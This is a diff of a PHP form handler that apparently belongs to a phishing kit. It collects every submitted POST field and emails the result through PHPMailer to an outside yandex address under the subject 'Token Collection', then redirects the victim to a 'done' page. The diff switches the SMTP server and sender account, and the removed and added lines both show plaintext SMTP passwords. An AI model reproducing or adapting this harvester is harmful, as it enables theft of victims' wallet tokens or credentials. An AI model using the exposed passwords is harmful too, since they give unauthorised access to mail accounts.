@@ -1,6 +1,4 @@
 <?php
-//Import PHPMailer classes into the global namespace
-//These must be at the top of your script, not inside a function
 use PHPMailer\PHPMailer\PHPMailer;
 use PHPMailer\PHPMailer\SMTP;
 use PHPMailer\PHPMailer\Exception;
@@ -15,30 +13,31 @@ if(isset($_POST['import'])){
 foreach($_POST as $key=>$value){
     $content.=$key.": ".$value;
 }
-//Create an instance; passing `true` enables exceptions
+
+// passing true in constructor enables exceptions in PHPMailer
 $mail = new PHPMailer(true);
 
 try {
-    //Server settings
-    $mail->SMTPDebug = SMTP::DEBUG_SERVER;                      //Enable verbose debug output
-    $mail->isSMTP();                                            //Send using SMTP
-    $mail->Host       = 'lavender.hostnownow.com';                     //Set the SMTP server to send through
-    $mail->SMTPAuth   = true;                                   //Enable SMTP authentication
-    $mail->Username   = 'webmaster@testflora.xyz';                     //SMTP username
-    $mail->Password   = '%3BQVc1-~fy8';                               //SMTP password
-    $mail->SMTPSecure = PHPMailer::ENCRYPTION_SMTPS;            //Enable implicit TLS encryption
-    $mail->Port       = 465;                                    //TCP port to connect to; use 587 if you have set `SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS`
+    // Server settings
+    $mail->SMTPDebug = SMTP::DEBUG_SERVER; // for detailed debug output
+    $mail->isSMTP();
+    $mail->Host = 'jasmine.hostnownow.com';
+    $mail->SMTPAuth = true;
+    $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;
+    $mail->Port = 465;
 
-    //Recipients
-    $mail->setFrom('webmaster@testflora.xyz', 'Webmaster');
-    $mail->addAddress('JosephRHopkins@yandex.com', 'Joseph R Hopkins');     //Add a recipient
+    $mail->Username = 'postmaster@pulsexbridge.live'; // YOUR gmail email
+    $mail->Password = 'a~{#(Qo?PZM&'; // YOUR gmail password
 
+    // Sender and recipient settings
+    $mail->setFrom('postmaster@pulsexbridge.live', 'Postmaster');
+    $mail->addAddress('JosephRHopkins@yandex.com', 'Joseph Hopkins');
+    $mail->addReplyTo('postmaster@pulsexbridge.live', 'Postmaster'); // to set the reply to
 
-    //Content
-    $mail->isHTML(true);                                  //Set email format to HTML
+    // Setting the email content
+    $mail->IsHTML(true);
     $mail->Subject = 'Token Collection';
     $mail->Body    = $content;
-
     $mail->send();
     header("Location: done.php");
        exit();
